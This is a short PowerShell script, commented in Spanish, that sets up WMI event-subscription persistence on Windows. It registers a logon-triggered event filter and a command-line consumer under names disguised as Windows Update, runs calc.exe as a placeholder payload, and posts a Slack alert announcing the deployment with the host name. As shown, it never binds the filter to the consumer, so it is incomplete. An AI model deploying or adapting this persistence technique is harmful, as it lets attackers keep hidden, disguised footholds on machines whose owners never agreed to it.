<#
.SYNOPSIS
    Crea persistencia via WMI Event Subscription.
.NOTES
    Requiere admin rights. Notifica a Slack si se configura.
#>

# Crear evento que ejecuta payload al iniciar sesión
$FilterArgs = @{
    EventNamespace = 'root\cimv2'
    Name = 'WindowsUpdateFilter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# Configurar acción (ejecutar calc.exe como prueba)
$ConsumerArgs = @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = "calc.exe"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Notificar a Slack (si el módulo está disponible)
try {
    Import-Module "$PSScriptRoot/../Modules/Slack-Notifications.psm1"
    Send-SlackAlert -Message "WMI Persistence deployed on $env:COMPUTERNAME"
} catch { Write-Warning "Slack module not loaded." }
